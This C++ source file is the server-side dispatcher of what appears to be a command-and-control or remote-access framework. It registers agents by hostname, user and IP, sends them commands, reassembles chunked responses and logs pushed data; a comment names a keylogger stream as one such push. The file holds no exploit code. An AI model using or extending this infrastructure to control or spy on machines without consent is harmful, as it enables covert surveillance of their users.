#include "server_dispatcher.hpp"

#include <iostream>
#include <sstream>
#include <stdexcept>

#include "codec/metrics_parser.hpp"
#include "codec/protocol_helper.hpp"
#include "codec/protocol_parser.hpp"
#include "codec/protocol_serializer.hpp"
#include "logger.hpp"
#include "socket/i_socket.hpp"
// ServerDispatcher::ServerDispatcher() {}
ServerDispatcher::ServerDispatcher() : Dispatcher() {}

void ServerDispatcher::handleFrame(FrameTransport& agent, const Frame& frame) {
  AgentConnection& connection = static_cast<AgentConnection&>(agent);
  switch (frame.header.type) {
    case MessageType::REGISTER:
      onRegister(connection, frame.payload);
      break;
    case MessageType::RESPONSE:
      onResponse(connection, frame.payload);
      break;
    case MessageType::DATA:
      onData(frame.payload);
      break;
    // case MessageType::DISCONNECT:
    //   running = false;
    //   break;
    case MessageType::ERROR:
      onError(frame.payload);
      break;
    default:
      sendError(agent, ErrorType::UNKNOWN_TYPE, "Unexpected message type");
  }
}

// ── Incoming handlers ────────────────────────────────────────

// The first message from the agent must always be REGISTER.
// Once we know who it is, we kick off the command sequence.
void ServerDispatcher::onRegister(AgentConnection& agent,
                                  const std::vector<std::uint8_t>& payload) {
  OsInfoPayload agentInfo = ProtocolParser::parseOsInfoPayload(payload);
  agent.setAgentInfo(agentInfo);
  agent.setId(agentInfo.hostname);

  std::ostringstream what;
  what << "[REGISTER] \nhostname : " << agentInfo.hostname
       << "\nuser : " << agentInfo.current_user
       << "\nos : " << static_cast<int>(agentInfo.os_type)
       << "\narch : " << static_cast<int>(agentInfo.arch)
       << "\nversion : " << agentInfo.os_version << "\nip : " << agentInfo.ip;
  Logger::info("server dispatcher", what.str());
}

// A RESPONSE carries the same id as the COMMAND it answers,
// plus chunk metadata for large payloads split across messages.
void ServerDispatcher::onResponse(AgentConnection& agent,
                                  const std::vector<std::uint8_t>& payload) {
  std::ostringstream what;
  what << "Response from agent :" << agent.getAgentInfo().ip << "\n";
  Logger::info("server dispatcher", what.str());

  const ResponsePayload response =
      ProtocolParser::parseResponsePayload(payload);

  if (response.total_chunks == 1) {
    processCompleteResponse(response);
    return;
  }

  createResponseEntry(response);

  IncompleteResponse& incomplete = pendingResponses_[response.id];
  incomplete.data.insert(incomplete.data.end(), response.data.begin(),
                         response.data.end());
  tryCompleteResponse(response);
}

// DATA messages are pushed by the agent without a prior COMMAND
// (e.g. keylogger stream). Handle them independently of the
// request/response cycle.
void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
  const DataPayload data = ProtocolParser::parseDataPayload(payload);
  std::ostringstream what;
  what << "[DATA] subtype=" << static_cast<int>(data.subtype) << "\n";
  if (data.subtype == DataType::METRICS_SAMPLE) {
    MetricsSample sample = MetricsParser::parseMetricsSample(data.data);

    what << "[DATA] METRICS_SAMPLE\n";

    what << "CPU: " << sample.cpu.total_percent << "%\n";
    what << "CPU cores: ";
    for (float core : sample.cpu.per_core) what << core << "% ";
    what << '\n';

    what << "Memory: " << sample.mem.phys_used << "/" << sample.mem.phys_total
         << " bytes used\n";

    for (const auto& disk : sample.disks) {
      what << "Disk " << disk.device << " R=" << disk.read_bytes_per_sec
           << " W=" << disk.write_bytes_per_sec << '\n';
    }

    for (const auto& iface : sample.interfaces) {
      what << "Net " << iface.iface << " RX=" << iface.rx_bytes_per_sec
           << " TX=" << iface.tx_bytes_per_sec << '\n';
    }
  }
  Logger::info("server dispatcher", what.str());
}

// ── Outgoing senders ─────────────────────────────────────────

void ServerDispatcher::sendCommand(AgentConnection& agent, CommandType type,
                                   const std::string& data) {
  CommandPayload command;
  command.id = nextId();
  command.type = type;
  command.data = data;
  const std::vector<std::uint8_t> payload =
      ProtocolSerializer::serializeCommandPayload(command);

  Frame frame = {ProtocolHelper::createHeader(MessageType::COMMAND, payload),
                 payload};
  agent.sendFrame(frame);
  std::ostringstream what;
  what << "[COMMAND] id=" << command.id
       << "  type=" << static_cast<int>(command.type);
  Logger::info("server dispatcher", what.str());
}

void ServerDispatcher::setDashboard(
    std::shared_ptr<DashboardConnection> dashboard) {
  dashboard_ = dashboard;
}

void ServerDispatcher::sendDisconnect(AgentConnection& agent) {
  const std::vector<uint8_t> payload{};
  Frame frame = {ProtocolHelper::createHeader(MessageType::DISCONNECT, payload),
                 payload};

  agent.sendFrame(frame);
  Logger::info("server dispatcher", "[DISCONNECT]");
}

std::uint32_t ServerDispatcher::nextId() { return nextCmdId_++; }

void ServerDispatcher::createResponseEntry(const ResponsePayload& response) {
  if (pendingResponses_.find(response.id) == pendingResponses_.end()) {
    IncompleteResponse incomplete;
    incomplete.baseResponse = response;
    pendingResponses_[response.id] = incomplete;
  }
}

void ServerDispatcher::processCompleteResponse(
    const ResponsePayload& response) {
  std::ostringstream what;
  what << "[RESPONSE] id=" << response.id
       << " status=" << static_cast<int>(response.status) << "\n"
       << ProtocolParser::toString(response.data);
  Logger::info("server dispatcher", what.str());

  if (pendingResponses_.find(response.id) != pendingResponses_.end()) {
    pendingResponses_.erase(response.id);
  }
}

void ServerDispatcher::tryCompleteResponse(const ResponsePayload& response) {
  const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
  if (lastChunk) {
    IncompleteResponse& incomplete = pendingResponses_[response.id];

    // if (incomplete.chunksReceived != response.total_chunks) {
    //   throw std::runtime_error("Missing chunks for response id " +
    //                            std::to_string(response.id));
    // }

    // Reassemble all chunks
    ResponsePayload complete = incomplete.baseResponse;
    complete.data = incomplete.data;

    processCompleteResponse(complete);
  }
}